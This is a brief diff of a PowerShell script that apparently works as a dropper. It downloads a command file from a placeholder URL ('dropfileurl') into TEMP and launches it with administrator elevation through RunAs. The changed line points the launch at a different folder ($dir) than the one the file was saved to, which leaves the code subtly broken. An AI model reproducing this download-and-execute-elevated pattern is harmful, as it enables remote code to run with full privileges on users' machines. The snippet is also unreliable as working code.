@@ -6,7 +6,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Invoke-WebRequest -Uri "dropfileurl" -OutFile "$env:TEMP\run.cmd"
     
     # Run the CMD file as admin
-    Start-Process "$env:TEMP\run.cmd" -Verb RunAs
+    Start-Process "$dir\run.cmd" -Verb RunAs
     # Sleep
     Start-Sleep -Seconds 8
 }
